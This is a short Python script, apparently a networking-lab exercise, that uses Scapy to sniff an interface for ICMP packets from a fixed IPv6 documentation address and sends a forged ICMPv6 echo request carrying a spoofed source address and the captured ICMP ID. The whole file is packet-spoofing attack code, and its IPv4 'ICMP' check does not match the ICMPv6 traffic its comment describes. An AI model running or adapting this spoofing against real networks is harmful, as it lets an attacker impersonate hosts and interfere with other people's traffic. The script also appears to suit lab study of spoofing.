#!/usr/bin/env python3

from scapy.all import *


# This scritp sniffes the communication channel on Interface ens34, looks for ICMPv6 packet.
# Then, it spoofes the source IP address of the found packet and sends identical packet to the same recipient.

# function to process the packet
def packet_handler(packet):

        if ICMP in packet and packet[IPv6].src == "2001:db8:0:1::2":
            icmp_id = packet.getlayer(ICMP).id
            print("[+] Found ICMPv6 packet with source port (ICMP-ID): ", icmp_id)
            ether = Ether(dst="00:0c:29:18:4c:dc", src="00:0e:31:29:5b:af")
            ipv6 = IPv6(src="2001:db8:0:1::2", dst="2001:db8:2::2")
            icmp6 = ICMPv6EchoRequest(id=icmp_id, data="From Ameen with Love!")
            new_packet = ether/ipv6/icmp6
            sendp(new_packet, iface="ens34")

sniff(iface='ens34', prn=packet_handler)
